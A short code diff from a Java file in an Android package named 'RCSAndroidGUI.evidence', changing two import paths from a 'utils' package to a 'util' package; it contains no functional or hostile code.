@@ -8,8 +8,8 @@
  * *******************************************/
 package com.ht.RCSAndroidGUI.evidence;
 
-import com.ht.RCSAndroidGUI.utils.Check;
-import com.ht.RCSAndroidGUI.utils.DataBuffer;
+import com.ht.RCSAndroidGUI.util.Check;
+import com.ht.RCSAndroidGUI.util.DataBuffer;
 
 // TODO: Auto-generated Javadoc
 /**
